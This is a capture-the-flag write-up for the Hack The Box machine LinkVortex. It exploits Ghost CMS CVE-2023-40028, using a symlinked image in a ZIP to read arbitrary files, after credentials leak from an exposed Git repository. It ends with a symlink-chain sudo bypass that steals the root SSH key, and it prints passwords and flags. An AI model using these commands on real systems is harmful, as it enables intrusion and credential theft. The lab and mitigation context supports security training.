# 🧠 WRITE-UP FOR LinkVortex - HTB
## 0. Overview

- **Target IP:** `10.10.11.47`
- **Machine :** https://app.hackthebox.com/machines/638
- **Category:** Linux / Web / Git / Misconfigured sudo / Symlink
- **Difficulty:** Easy
- **AutoPwn Exploit script: 🔗** → [autopwn_root.py](https://github.com/maikneysm/AutoPwn-LinkVortex.htb/blob/main/autopwn_root.py)
- **Summary:** This machine leverages Ghost CMS with a file-read vulnerability (CVE-2023-40028), a leaked Git repository, and a misconfigured sudo script that allows privilege escalation to root via symbolic link abuse.
---
## 1. Enumeration & Recon
### 🔹 1.1 Initial Scan (Nmap)
```
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    Apache httpd
```
- Port 80 redirects to `http://linkvortex.htb/`
- Discovered subdomain: `dev.linkvortex.htb` using tools like ``gobuster`` or ``ffuf``
### 🔹 1.2 Fuzzing & Git Dump
- Directory `.git/` is exposed on `http://dev.linkvortex.htb/.git/`
- Used `GitHack.py` to reconstruct the full source code of the Ghost CMS instance (https://github.com/lijiejie/GitHack/tree/master)
```bash
python3 GitHack.py http://dev.linkvortex.htb/.git/ 

├── dev.linkvortex.htb
│   ├── Dockerfile.ghost
│   └── ghost
│       └── core
│           └── test
│               └── regression
│                   └── api
│                       └── admin
│                           └── authentication.test.js
```
---
## 2. Git Source Code Analysis
### 🔹 2.1 Version and Context
- `Dockerfile.ghost` reveals the CMS version: **Ghost v5.58.0**
- Repository includes test scripts, configuration files, and deployment logic
```bash
❯ cat Dockerfile.ghost
	FROM ghost:5.58.0

	# Copy the config
	COPY config.production.json /var/lib/ghost/config.production.json
	
	# Prevent installing packages
	RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb

	# Wait for the db to be ready first
	COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
	COPY entry.sh /entry.sh
	RUN chmod +x /var/lib/ghost/wait-for-it.sh
	RUN chmod +x /entry.sh

	ENTRYPOINT ["/entry.sh"]
	CMD ["node", "current/index.js"]
```
### 🔹 2.2 Credential Discovery
- Hardcoded test credentials found in: `core/test/regression/api/admin/authentication.test.js`
```bash
❯ cat dev.linkvortex.htb/ghost/core/test/regression/api/admin/authentication.test.js

  54   │         it('complete setup', async function () {
  55   │             const email = 'test@example.com';
  56   │             const password = 'OctopiFociPilfer45';
  57   │ 
  58   │             const requestMock = nock('https://api.github.com')
  59   │                 .get('/repos/tryghost/dawn/zipball')
  60   │                 .query(true)
  61   │                 .replyWithFile(200, fixtureManager.getPathForFixture('themes/valid.zip'));
```
Login succeeded at `http://linkvortex.htb/ghost/#/dashboard` with:
- **User:** `admin@linkvortex.htb`
- **Password:** `OctopiFociPilfer45`
---
## 3. CVE-2023-40028 – Ghost CMS Arbitrary File Read
### 🔹 3.1 Manual Exploitation of CVE-2023-40028 (Step-by-step)
- Ghost CMS accepts `.png` uploads
- Symlinks are not sanitized if they target non-critical paths
- The script backend reveals file contents if `CHECK_CONTENT=true` is passed
- More info -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-40028
The following steps replicate the vulnerable behavior manually using symbolic links and a crafted ZIP archive:
#### 🗂️ 1. Prepare folder structure
```bash
❯ mkdir -p content/images/2024/
```
#### 🔗 2. Create symlink to a file you want to read (e.g., `/etc/passwd`)
```bash
ln -s /etc/passwd content/images/2024/exploit.png
```
(You can change `/etc/passwd` to any file like `/var/lib/ghost/config.production.json` or `/root/.ssh/id_rsa` if later combined with sudo bypass)
#### 📦 4. Create ZIP archive with preserved symlinks
```bash
zip -r -y exploit.zip content/images/2024/exploit.png
```
The `-y` option ensures the symbolic links are preserved inside the ZIP.
#### 🍪 5. Prepare your authenticated session
Log into Ghost (http://linkvortex.htb/ghost/) as `admin@linkvortex.htb` and extract the `ghost-admin-api-session` cookie from your browser

#### 📤 6. Send the payload via `curl` (with cookie in header)
```bash
curl -s \
  -H "X-Ghost-Version: 5.58" \
  -H "Cookie: ghost-admin-api-session=s%3ASX0VB4_Q_-Q41_RCTID0J--gb9QOeg0i.C7kB58yM9xYDzYxBMTl0X5rz9qDm63tumXpjzQATDbo" \
  -H "Content-Type: multipart/form-data" \
  -F "importfile=@exploit.zip;type=application/zip" \
  "http://linkvortex.htb/ghost/api/v3/admin/db"
```
🔐 **Important:**  
- Replace the value of `ghost-admin-api-session` with **your own valid session cookie**, which you can obtain after logging into the Ghost admin panel (`/ghost/`) in your browser. You can extract this cookie from your browser's developer tools → `Storage` or `Application` tab.
- If the session is expired or incorrect, the server will reject the request with a `403 Forbidden`.

✅ If the symlink inside the zip is not filtered, the server processes it, and the target file becomes accessible (either via output or secondary mechanism like quarantine).
#### 📄 7. Retrieve the File Content 
Once the `.zip` archive containing the symlink has been successfully uploaded and processed by Ghost, the symlinked file becomes available under the standard public path used by the CMS to serve images.
Assuming you named the file `exploit.png`, you can retrieve its content with:
```bash
curl -s http://linkvortex.htb/content/images/2024/exploit.png
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```
This confirms that the vulnerability allows **arbitrary file read** through symbolic link abuse combined with the Ghost CMS import mechanism.
#### 🔹 3.2 Exploitation via Public PoC Script
- Used the public PoC script for CVE-2023-40028: [CVE-2023-40028 Ghost Shell](https://github.com/0xyassine/CVE-2023-40028)
- File read confirmed via symlinked `.png`
```bash
❯ chmod +x Ghost-5.58-RCE-CVE-2023-4002.sh
❯ ./Ghost-5.58-RCE-CVE-2023-4002.sh  -u 'admin@linkvortex.htb' -p 'OctopiFociPilfer45'
WELCOME TO THE CVE-2023-40028 SHELL
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
file> 
```
#### 🔹 3.3 Extraction of Mail Credentials
- Accessed the typical Ghost CMS configuration file: `/var/lib/ghost/config.production.json`
- Credentials found:
```json
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
```
---
## 4. SSH Access as User `bob`
- SSH login successful:
```bash
ssh bob@10.10.11.47
bob@linkvortex:~$ cat user.txt 
	f462e8a653bfc310177546d620acf30
```
- Obtained user flag ✅
- System is the host machine, not containerized
---
## 5. Privilege Escalation
### 🔹 5.1 Sudo Rights
```bash
bob@linkvortex:~$ sudo -l
(ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```
### 🔹 5.2 Vulnerable Script Breakdown
- Accepts one argument: a `.png` file
- Checks if it’s a symlink
- Rejects links pointing to `/etc` or `/root` directly
- Displays content if `CHECK_CONTENT=true` is set
### 🔹 5.3 Symlink Chain Bypass
```bash
ln -s /root/.ssh/id_rsa id_rsa.txt
ln -s /home/bob/id_rsa.txt id_rsa.png
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh id_rsa.png
```
---
## 6. Root Access
- Private key saved to `id_rsa_root`
- Root shell gained via:
```bash
chmod 600 id_rsa_root
ssh -i id_rsa_root root@10.10.11.47
root@linkvortex:~# cat root.txt 
	7ca5d24ecd7009c4c92bc7c591e3c577 
```
---
### 7. AutoPWN Privilege Escalation Script
- Script `autopwn_root.py` automates the entire  privilege escalation, more info -> [Autopwn LinkVortext](https://github.com/maikneysm/AutoPwn-LinkVortex.htb/blob/main/readme.md)
- Uses `paramiko` to connect as `bob`, extract the root SSH private key, and spawn an interactive root shell
---
### 8. Mitigations
- Never expose `.git` directories in production
- Do not hardcode credentials in test or production code
- Avoid giving `sudo` access to scripts processing user-controlled symlinks
- Whitelist explicitly safe file paths instead of weak blacklist patterns
